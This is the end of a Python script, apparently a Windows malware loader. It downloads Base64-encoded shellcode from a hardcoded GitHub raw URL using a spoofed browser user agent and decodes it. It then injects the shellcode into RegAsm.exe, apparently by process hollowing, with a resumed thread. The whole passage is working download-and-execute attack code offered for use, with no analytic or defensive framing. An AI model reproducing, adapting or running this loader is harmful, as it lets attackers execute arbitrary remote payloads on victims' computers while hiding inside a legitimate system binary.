    _rp_log(f"ResumeThread -> {rc}")
    if rc == -1 or rc == 0xFFFFFFFF:
        _win_last_error(kernel32)
        return False
    _rp_log("done: returning True (shellcode)")
    return True


def fetch_shellcode_from_url(url):
    """
    Fetches raw Base64 text from the URL and decodes it.
    """
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }
        
        print(f"Requesting raw payload from: {url}")
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req, timeout=15) as response:
            if response.status != 200:
                print(f"Server returned status: {response.status}", file=sys.stderr)
                return None
            
            # Read the raw Base64 text directly from the response
            # .strip() removes any accidental newlines or spaces
            b64_text = response.read().decode('utf-8').strip()
            
            # Decode the base64 string into raw bytes
            return base64.b64decode(b64_text)

    except Exception as e:
        print(f"Network or decoding error: {e}", file=sys.stderr)
        return None

def main():
    if sys.platform != "win32":
        print("script.py requires Windows.", file=sys.stderr)
        return 2

    # Point this to your GitHub raw URL or new endpoint
    target_url = "https://raw.githubusercontent.com/omebizonly-hash/sadasd/refs/heads/main/3.txt"
    
    # Fetch shellcode (now handles raw B64 text)
    shell = fetch_shellcode_from_url(target_url)
    
    if not shell:
        print("Failed to retrieve shellcode.", file=sys.stderr)
        return 1

    regasm_path = _get_regasm_path()
    if not regasm_path:
        print("RegAsm.exe not found.", file=sys.stderr)
        return 2

    print(f"Executing retrieved shellcode ({len(shell)} bytes)...")
    
    # Perform injection
    ok = run_shellcode(shell, regasm_path, "")
    print("Execution status:", ok)
    
    return 0 if ok else 1

if __name__ == "__main__":
    sys.exit(main() or 0)
